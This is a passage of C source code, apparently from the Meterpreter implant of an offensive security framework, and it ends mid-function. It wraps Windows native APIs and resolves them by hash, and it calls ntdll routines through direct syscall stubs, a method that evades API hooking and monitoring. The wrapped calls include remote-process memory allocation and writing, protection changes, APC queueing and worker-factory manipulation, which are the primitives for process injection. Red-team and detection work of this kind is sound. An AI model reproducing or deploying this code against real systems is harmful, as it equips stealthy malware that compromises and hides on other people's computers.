#ifndef _METERPRETER_WINAPI_C
#define _METERPRETER_WINAPI_C
#include "winapi.h"

#include "../ReflectiveDLLInjection/dll/src/DirectSyscall.h"
#include "common.h"

#include <stdarg.h>

#define KERNEL32_DLL "kernel32.dll"
#define NTDLL_DLL "ntdll.dll"
#define ADVAPI32_DLL "advapi32.dll"
#define CRYPT32_DLL "crypt32.dll"
#define USER32_DLL "user32.dll"
#define WS2_32_DLL "ws2_32.dll"
#define RPCRT4_DLL "rpcrt4.dll"
#define WINHTTP_DLL "winhttp.dll"
#define WININET_DLL "wininet.dll"
#define IPHLPAPI_DLL "iphlpapi.dll"
#define MPR_DLL "mpr.dll"
#define NETAPI32_DLL "netapi32.dll"
#define OLE32_DLL "ole32.dll"
#define OLEAUT32_DLL "oleaut32.dll"
#define PSAPI_DLL "psapi.dll"
#define QUERY_DLL "query.dll"
#define SHLWAPI_DLL "shlwapi.dll"
#define USERENV_DLL "userenv.dll"
#define WINMM_DLL "winmm.dll"
#define WTSAPI32_DLL "wtsapi32.dll"

#ifndef OBJ_INHERIT
#define OBJ_INHERIT 0x00000002L
#endif

typedef struct NtDllFunction {
    LPCSTR lpFunctionName;
    DWORD dwNumberOfArgs;
    DWORD dwCryptedHash; // _hash of lpFunctionName
} NtDllFunction;


enum NtDllSyscall {
    ZwAllocateVirtualMemory,
    ZwOpenProcess,
    ZwWriteVirtualMemory,
    ZwFlushInstructionCache,
    ZwReadVirtualMemory,
    ZwProtectVirtualMemory,
    ZwQueryVirtualMemory,
    ZwFreeVirtualMemory,
    ZwQueryInformationProcess,
    ZwQueryObject,
    ZwQueryInformationWorkerFactory,
    ZwSetInformationWorkerFactory,
    ZwSetIoCompletion,
    ZwMapViewOfSection,
    ZwCreateSection,
    ZwOpenSection,
    ZwOpenFile,
    ZwQueryAttributesFile,
    ZwClose,
    ZwLockVirtualMemory,
    ZwUnmapViewOfSection
};


NtDllFunction lpFunctionsTobeLoaded[] = {
    {.lpFunctionName = NULL /* ZwAllocateVirtualMemory */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwAllocateVirtualMemory},
    {.lpFunctionName = NULL /* ZwOpenProcess */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwOpenProcess},
    {.lpFunctionName = NULL /* ZwWriteVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwWriteVirtualMemory},
    {.lpFunctionName = NULL /* ZwFlushInstructionCache */, .dwNumberOfArgs = 3, .dwCryptedHash = H_ZwFlushInstructionCache},
    {.lpFunctionName = NULL /* ZwReadVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwReadVirtualMemory},
    {.lpFunctionName = NULL /* ZwProtectVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwProtectVirtualMemory},
    {.lpFunctionName = NULL /* ZwQueryVirtualMemory */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwQueryVirtualMemory},
    {.lpFunctionName = NULL /* ZwFreeVirtualMemory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwFreeVirtualMemory},
    {.lpFunctionName = NULL /* ZwQueryInformationProcess */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryInformationProcess},
    {.lpFunctionName = NULL /* ZwQueryObject */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryObject},
    {.lpFunctionName = NULL /* ZwQueryInformationWorkerFactory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryInformationWorkerFactory},
    {.lpFunctionName = NULL /* ZwSetInformationWorkerFactory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwSetInformationWorkerFactory},
    {.lpFunctionName = NULL /* ZwSetIoCompletion */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwSetIoCompletion},
    {.lpFunctionName = NULL /* ZwMapViewOfSection */, .dwNumberOfArgs = 10, .dwCryptedHash = H_ZwMapViewOfSection},
    {.lpFunctionName = NULL /* ZwCreateSection */, .dwNumberOfArgs = 7, .dwCryptedHash = H_ZwCreateSection},
    {.lpFunctionName = NULL /* ZwOpenSection */, .dwNumberOfArgs = 3, .dwCryptedHash = H_ZwOpenSection},
    {.lpFunctionName = NULL /* ZwOpenFile */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwOpenFile},
    {.lpFunctionName = NULL /* ZwQueryAttributesFile */, .dwNumberOfArgs = 2, .dwCryptedHash = H_ZwQueryAttributesFile},
    {.lpFunctionName = NULL /* ZwClose */, .dwNumberOfArgs = 1, .dwCryptedHash = H_ZwClose},
    {.lpFunctionName = NULL /* ZwLockVirtualMemory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwLockVirtualMemory},
    {.lpFunctionName = NULL /* ZwUnmapViewOfSection */, .dwNumberOfArgs = 2, .dwCryptedHash = H_ZwUnmapViewOfSection},};

#define STATUS_SUCCESS 0
Syscall** volatile lpWinApiSyscalls = NULL;

extern NTSTATUS SyscallStub(Syscall *pSyscall, DWORD dwNumberOfArgs, ULONG_PTR *lpArgs);

DWORD GetWindowsMajorMinVer() {
    DWORD dwResult = 0;
    OSVERSIONINFOEXW os = {0};
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    NTSTATUS status = winapi_ntdll_RtlGetVersion(&os);
    if(status != STATUS_SUCCESS) {
        dprintf("[WINAPI][GetWindowsMajorMinVer] RtlGetVersion returned %p", status);
        return 0;
    }
    dwResult = (os.dwMajorVersion << 8 & 0xff00) | (os.dwMinorVersion & 0xff);
    return dwResult; 
}

Syscall** GetOrInitWinApiSyscalls() {
    Syscall** initializedSyscalls = lpWinApiSyscalls;
    if (initializedSyscalls != NULL) {
        return initializedSyscalls;
    }

    BOOL bError = FALSE;
    HANDLE hHeap = GetProcessHeap();
    DWORD dwNumbOfSyscalls = sizeof(lpFunctionsTobeLoaded) / sizeof(NtDllFunction);
    Syscall** candidateSyscalls = NULL;
    Syscall* lpSyscall = NULL;

    bError = hHeap == NULL;
    if (!bError) {
        candidateSyscalls = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall*) * dwNumbOfSyscalls);
        dprintf("[WINAPI][GetOrInitWinApiSyscalls] candidateSyscalls = %p", candidateSyscalls);
        bError = candidateSyscalls == NULL;
    }

    if (!bError) {
        for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
            lpSyscall = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));
            bError = lpSyscall == NULL;
            if (bError) {
                break;
            }
            if (lpFunctionsTobeLoaded[i].lpFunctionName != NULL) {
                lpSyscall->dwCryptedHash = _hash((char*)lpFunctionsTobeLoaded[i].lpFunctionName);
            } else {
                lpSyscall->dwCryptedHash = lpFunctionsTobeLoaded[i].dwCryptedHash;
            }
            lpSyscall->dwNumberOfArgs = lpFunctionsTobeLoaded[i].dwNumberOfArgs;
            candidateSyscalls[i] = lpSyscall;
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpSyscall = %p; dwCryptedHash = %p", lpSyscall, lpSyscall->dwCryptedHash);
        }
    }

    if (!bError) {
        bError = !getSyscalls(GetModuleHandleA(NTDLL_DLL), candidateSyscalls, dwNumbOfSyscalls);
        if (!bError) {
            for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                dprintf("[WINAPI][GetOrInitWinApiSyscalls] Index: %d pStub: %p, dwSyscallNr: %d", i, candidateSyscalls[i]->pStub, candidateSyscalls[i]->dwSyscallNr);
            }
        }
    }

    if (!bError) {
        initializedSyscalls = (Syscall**)InterlockedCompareExchangePointer(
            (PVOID volatile*)&lpWinApiSyscalls,
            candidateSyscalls,
            NULL);
        if (initializedSyscalls == NULL) {
            return candidateSyscalls;
        }
    } else {
        dprintf("[WINAPI][GetOrInitWinApiSyscalls] Error creating Syscall structure.");
    }

    if (candidateSyscalls != NULL) {
        for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
            if (candidateSyscalls[i] != NULL) {
                HeapFree(hHeap, 0, candidateSyscalls[i]);
            }
        }
        HeapFree(hHeap, 0, candidateSyscalls);
    }

    return lpWinApiSyscalls;
}

BOOL hasDirectSyscallSupport() {
    DWORD dwVersion = GetWindowsMajorMinVer();
    DWORD dwMajor = (dwVersion & 0xff00) >> 8;
    DWORD dwMinor = dwVersion & 0xff;
    if(dwVersion != 0 && (dwMajor > 6 || (dwMajor == 6 && dwMinor >= 1))) {
        if(lpWinApiSyscalls == NULL) {
            GetOrInitWinApiSyscalls();
        }
        return lpWinApiSyscalls != NULL;
    }
    return FALSE;
}


// Disable Spectre mitigation warning for this sensitive, low-level code.
#if _MSC_VER >= 1914
#pragma warning(disable : 5045) // warning C5045: Compiler will insert Spectre mitigation for memory load if /Qspectre switch specified
#endif

static HMODULE GetRetainedModule(LPCSTR moduleName)
{
    // Every caller stores an export in a process-lifetime cache. Keep the
    // LoadLibrary reference for the same lifetime so the cached pointer can
    // never outlive its module. Repeated calls only increment the loader's
    // reference count; they do not reinitialise an already loaded module.
    return LoadLibraryA(moduleName);
}

static BOOL RetainResolvedFunctionModule(FARPROC function)
{
    HMODULE functionModule = NULL;

    if (function == NULL) {
        return FALSE;
    }

    // Native GetProcAddress can resolve a forwarded export into a different
    // physical module. Retain that final module as well as the source module.
    // The reference is intentionally held for the process-lifetime cache.
    return GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCSTR)function,
        &functionModule);
}

static FARPROC GetProcAddressHInternal(HANDLE hModule, DWORD dwFunctionHash, BOOL retainResolvedModule)
{
	if (!hModule)
		return NULL;

	UINT_PTR uiLibraryAddress = (UINT_PTR)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiLibraryAddress;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;

	// STEP 1: Validate the PE headers to ensure we are parsing a valid module.
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// STEP 2: Locate the Export Address Table (EAT). If the module has no exports, return NULL.
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (pDataDirectory->VirtualAddress == 0)
		return NULL;

	DWORD dwExportDirRva = pDataDirectory->VirtualAddress;
	DWORD dwExportDirSize = pDataDirectory->Size;
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + dwExportDirRva);

	// STEP 3: Get pointers to the three critical arrays within the EAT.
	// AddressOfFunctions: RVAs to the actual function code.
	PDWORD pdwAddressArray = (PDWORD)(uiLibraryAddress + pExportDirectory->AddressOfFunctions);
	// AddressOfNames: RVAs to the function name strings.
	PDWORD pdwNameArray = (PDWORD)(uiLibraryAddress + pExportDirectory->AddressOfNames);
	// AddressOfNameOrdinals: An array of WORDs that maps names to ordinals.
	PWORD pwNameOrdinals = (PWORD)(uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);
    // ---- IMPORT BY NAME ----
    // Iterate through the array of exported function names.
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        LPCSTR cpExportedFunctionName = (LPCSTR)(uiLibraryAddress + pdwNameArray[i]);

        // Perform a case-sensitive string comparison to find a match.
        if (_hash((char *)cpExportedFunctionName) == dwFunctionHash)
        {
            if (retainResolvedModule) {
                FARPROC function = GetProcAddress((HMODULE)hModule, cpExportedFunctionName);

                // Let the Windows loader handle named/ordinal forwarders and
                // API-set host mapping, then retain the module that owns the
                // final callable address.
                if (!RetainResolvedFunctionModule(function)) {
                    return NULL;
                }
                return function;
            }

            // Match found. The index 'i' is the key to link the three arrays.
            // Use 'i' to get the function's ordinal from the name ordinals array.
            WORD wFunctionOrdinal = pwNameOrdinals[i];

            // Use the ordinal to get the function's RVA from the address table.
            DWORD dwFunctionRva = pdwAddressArray[wFunctionOrdinal];

            // This should not happen for a named export, but as a safeguard.
            if (dwFunctionRva == 0)
                return NULL;

            // Forwarder detection: if the RVA falls inside the export directory,
            // the "address" is actually a forwarder string of the form
            // "TargetDll.TargetFunction" (or ".#Ordinal"). We must resolve it in
            // the target DLL rather than returning the string as a function.
            if (dwFunctionRva >= dwExportDirRva && dwFunctionRva < (dwExportDirRva + dwExportDirSize))
            {
                LPCSTR cpForwarder = (LPCSTR)(uiLibraryAddress + dwFunctionRva);
                CHAR szDllName[64] = { 0 };
                DWORD dwDot = 0;
                while (cpForwarder[dwDot] && cpForwarder[dwDot] != '.') dwDot++;
                if (cpForwarder[dwDot] != '.' || dwDot == 0 || dwDot + 5 > sizeof(szDllName)) {
                    return NULL;
                }
                for (DWORD k = 0; k < dwDot; k++) szDllName[k] = cpForwarder[k];
                // Append ".dll" so LoadLibrary/GetModuleHandle find it.
                szDllName[dwDot + 0] = '.';
                szDllName[dwDot + 1] = 'd';
                szDllName[dwDot + 2] = 'l';
                szDllName[dwDot + 3] = 'l';
                szDllName[dwDot + 4] = 0;

                HMODULE hFwdModule = GetModuleHandleA(szDllName);
                if (hFwdModule == NULL) {
                    hFwdModule = LoadLibraryA(szDllName);
                }
                if (hFwdModule == NULL) {
                    return NULL;
                }
                // Resolve by re-hashing the target function name (everything after '.').
                DWORD dwFwdHash = _hash((char *)(cpForwarder + dwDot + 1));
                return GetProcAddressHInternal(hFwdModule, dwFwdHash, FALSE);
            }

            // Return the absolute address of the function.
            return (FARPROC)(uiLibraryAddress + dwFunctionRva);
        }
	}

	// The requested function was not found in the export table.
	return NULL;
}

FARPROC WINAPI GetProcAddressH(HANDLE hModule, DWORD dwFunctionHash)
{
    return GetProcAddressHInternal(hModule, dwFunctionHash, FALSE);
}

void* GetFunctionH(LPCSTR lpModuleName, DWORD dwFunctionHash) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddressH(hModule, dwFunctionHash);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunctionH] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunctionH] Unable to find function's address (Hash: %p).", dwFunctionHash);
    }
    return lpOutput;
}

static FARPROC GetFunctionHRetained(LPCSTR moduleName, DWORD functionHash) {
    HMODULE module = GetRetainedModule(moduleName);
    FARPROC function = NULL;

    if (module != NULL) {
        function = GetProcAddressHInternal(module, functionHash, TRUE);
    }
    if (module == NULL) {
        dprintf("[WINAPI][GetFunctionHRetained] Unable to find or load '%s' module.", moduleName);
    }
    if (function == NULL) {
        dprintf("[WINAPI][GetFunctionHRetained] Unable to find function's address (Hash: %p).", functionHash);
    }
    return function;
}

enum WinApiFunctionCacheState {
    WinApiFunctionCacheEmpty = 0,
    WinApiFunctionCacheResolving,
    WinApiFunctionCacheReady
};

DECLSPEC_NOINLINE FARPROC GetFunctionHCached(WinApiFunctionCache* cache, LPCSTR moduleName, DWORD functionHash) {
    DWORD lastError;
    FARPROC function = NULL;
    LONG state;

    if (cache == NULL) {
        return NULL;
    }

    // The steady-state path consists only of an interlocked read and a pointer
    // load. Neither operation changes the thread's last-error value.
    state = InterlockedCompareExchange(
        &cache->state,
        WinApiFunctionCacheReady,
        WinApiFunctionCacheReady);
    if (state == WinApiFunctionCacheReady) {
        return cache->function;
    }

    lastError = GetLastError();
    state = InterlockedCompareExchange(
        &cache->state,
        WinApiFunctionCacheResolving,
        WinApiFunctionCacheEmpty);

    if (state == WinApiFunctionCacheEmpty) {
        function = GetFunctionHRetained(moduleName, functionHash);
        cache->function = function;

        // Publish both successful and failed export lookups. A NULL result is
        // intentionally permanent for the lifetime of this cache.
        InterlockedExchange(&cache->state, WinApiFunctionCacheReady);
    } else if (state == WinApiFunctionCacheReady) {
        function = cache->function;
    } else {
        // Never wait for a resolver that may be blocked in loader code or may
        // have terminated. The winner alone publishes to the cache; a loser
        // performs an independent lookup for this call.
        function = GetFunctionHRetained(moduleName, functionHash);
    }

    // Module loading and export parsing are implementation details of the
    // wrapper and must not alter the error observed by its caller.
    SetLastError(lastError);
    return function;
}

#ifdef DEBUGTRACE
#define WINAPI_CACHE_DPRINTF(...) do { \
    DWORD winApiCacheLastError = GetLastError(); \
    dprintf(__VA_ARGS__); \
    SetLastError(winApiCacheLastError); \
} while (0)
#else
#define WINAPI_CACHE_DPRINTF(...) do { } while (0)
#endif

// Hash-resolved WinApi entries use these macros so that every ordinary wrapper
// has the same one-time cache, native calling convention, logging, and failure
// path.
// The exported MetApi function itself intentionally retains the C calling
// convention used by the existing cross-module table.
#define DEFINE_CACHED_WINAPI_WRAPPER(returnType, wrapperName, nativeConvention, moduleName, functionHash, parameters, arguments, failureValue) \
    returnType wrapperName parameters { \
        typedef returnType (nativeConvention *NativeFunction) parameters; \
        static WinApiFunctionCache cache = WINAPI_FUNCTION_CACHE_INIT; \
        NativeFunction function = (NativeFunction)GetFunctionHCached(&cache, moduleName, functionHash); \
        WINAPI_CACHE_DPRINTF("[WINAPI][%s] Calling export @ %p", #wrapperName, function); \
        if (function) { \
            return function arguments; \
        } \
        return (failureValue); \
    }

#define DEFINE_CACHED_WINAPI_VOID_WRAPPER(wrapperName, nativeConvention, moduleName, functionHash, parameters, arguments) \
    VOID wrapperName parameters { \
        typedef VOID (nativeConvention *NativeFunction) parameters; \
        static WinApiFunctionCache cache = WINAPI_FUNCTION_CACHE_INIT; \
        NativeFunction function = (NativeFunction)GetFunctionHCached(&cache, moduleName, functionHash); \
        WINAPI_CACHE_DPRINTF("[WINAPI][%s] Calling export @ %p", #wrapperName, function); \
        if (function) { \
            function arguments; \
        } \
    }

// Remote process stubs need the native system-export address, not the address
// of the MetApi wrapper. Keep those raw lookups centralized and lifetime-safe.
#define DEFINE_CACHED_WINAPI_ADDRESS_GETTER(wrapperName, moduleName, functionHash) \
    FARPROC wrapperName(VOID) { \
        static WinApiFunctionCache cache = WINAPI_FUNCTION_CACHE_INIT; \
        return GetFunctionHCached(&cache, moduleName, functionHash); \
    }

void* GetFunction(LPCSTR lpModuleName, LPCSTR lpFunctionName) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddress(hModule, lpFunctionName);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find '%s' function's address.", lpFunctionName);
    }
    return lpOutput;
}

// START: ntdll.dll

NTSTATUS winapi_ntdll_ZwAllocateVirtualMemory(HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)hProcess, (ULONG_PTR)pBaseAddress, (ULONG_PTR)pZeroBits, (ULONG_PTR)pRegionSize, (ULONG_PTR)ulAllocationType, (ULONG_PTR)ulProtect };
    return SyscallStub(lpWinApiSyscalls[ZwAllocateVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)ClientId };
    return SyscallStub(lpWinApiSyscalls[ZwOpenProcess], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)Buffer, (ULONG_PTR)NumberOfBytesToWrite, (ULONG_PTR)NumberOfBytesWritten };
    return SyscallStub(lpWinApiSyscalls[ZwWriteVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwFlushInstructionCache(HANDLE ProcessHandle, LPCVOID BaseAddress, SIZE_T NumberOfBytesToFlush) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)NumberOfBytesToFlush };
    return SyscallStub(lpWinApiSyscalls[ZwFlushInstructionCache], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwReadVirtualMemory(HANDLE ProcessHandle, LPCVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)Buffer, (ULONG_PTR)NumberOfBytesToRead, (ULONG_PTR)NumberOfBytesRead };
        return SyscallStub(lpWinApiSyscalls[ZwReadVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwReadVirtualMemory)(HANDLE, LPCVOID, PVOID, SIZE_T, PSIZE_T) = GetFunctionH(NTDLL_DLL, H_ZwReadVirtualMemory);
        dprintf("[WINAPI][winapi_ntdll_ZwReadVirtualMemory] Calling ZwReadVirtualMemory @ %p", pZwReadVirtualMemory);
        if (pZwReadVirtualMemory) {
            return pZwReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)NewProtect, (ULONG_PTR)OldProtect };
    return SyscallStub(lpWinApiSyscalls[ZwProtectVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)MemoryInformationClass, (ULONG_PTR)MemoryInformation, (ULONG_PTR)MemoryInformationLength, (ULONG_PTR)ReturnLength };
    return SyscallStub(lpWinApiSyscalls[ZwQueryVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)FreeType };
    return SyscallStub(lpWinApiSyscalls[ZwFreeVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

DEFINE_CACHED_WINAPI_WRAPPER(NTSTATUS, winapi_ntdll_ZwQueueApcThread, NTAPI, NTDLL_DLL, H_ZwQueueApcThread,
    (HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2),
    (ThreadHandle, ApcRoutine, ApcContext, Argument1, Argument2), 0xC0000001)

DEFINE_CACHED_WINAPI_WRAPPER(NTSTATUS, winapi_ntdll_ZwOpenThread, NTAPI, NTDLL_DLL, H_ZwOpenThread,
    (PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId),
    (ThreadHandle, DesiredAccess, ObjectAttributes, ClientId), 0xC0000001)

DEFINE_CACHED_WINAPI_WRAPPER(NTSTATUS, winapi_ntdll_RtlGetVersion, NTAPI, NTDLL_DLL, H_RtlGetVersion,
    (PRTL_OSVERSIONINFOEXW os), (os), 0xC0000001)

DEFINE_CACHED_WINAPI_WRAPPER(ULONG, winapi_ntdll_RtlNtStatusToDosError, NTAPI, NTDLL_DLL, H_RtlNtStatusToDosError,
    (NTSTATUS Status), (Status), ERROR_GEN_FAILURE)

NTSTATUS winapi_ntdll_ZwQueryInformationProcess(HANDLE ProcessHandle, INT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)ProcessInformationClass, (ULONG_PTR)ProcessInformation, (ULONG_PTR)ProcessInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryInformationProcess], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryInformationProcess)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryInformationProcess);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryInformationProcess] Calling ZwQueryInformationProcess @ %p", pZwQueryInformationProcess);
        if (pZwQueryInformationProcess) {
            return pZwQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryObject(HANDLE Handle, INT ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)Handle, (ULONG_PTR)ObjectInformationClass, (ULONG_PTR)ObjectInformation, (ULONG_PTR)ObjectInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryObject], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryObject)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryObject);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryObject] Calling ZwQueryObject @ %p", pZwQueryObject);
        if (pZwQueryObject) {
            return pZwQueryObject(Handle, ObjectInformationClass, ObjectInformation, ObjectInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryInformationWorkerFactory(HANDLE WorkerFactoryHandle, INT WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)WorkerFactoryHandle, (ULONG_PTR)WorkerFactoryInformationClass, (ULONG_PTR)WorkerFactoryInformation, (ULONG_PTR)WorkerFactoryInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryInformationWorkerFactory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryInformationWorkerFactory)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryInformationWorkerFactory);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryInformationWorkerFactory] Calling ZwQueryInformationWorkerFactory @ %p", pZwQueryInformationWorkerFactory);
        if (pZwQueryInformationWorkerFactory) {
            return pZwQueryInformationWorkerFactory(WorkerFactoryHandle, WorkerFactoryInformationClass, WorkerFactoryInformation, WorkerFactoryInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwSetInformationWorkerFactory(HANDLE WorkerFactoryHandle, INT WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)WorkerFactoryHandle, (ULONG_PTR)WorkerFactoryInformationClass, (ULONG_PTR)WorkerFactoryInformation, (ULONG_PTR)WorkerFactoryInformationLength };
        return SyscallStub(lpWinApiSyscalls[ZwSetInformationWorkerFactory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwSetInformationWorkerFactory)(HANDLE, INT, PVOID, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwSetInformationWorkerFactory);
        dprintf("[WINAPI][winapi_ntdll_ZwSetInformationWorkerFactory] Calling ZwSetInformationWorkerFactory @ %p", pZwSetInformationWorkerFactory);
        if (pZwSetInformationWorkerFactory) {
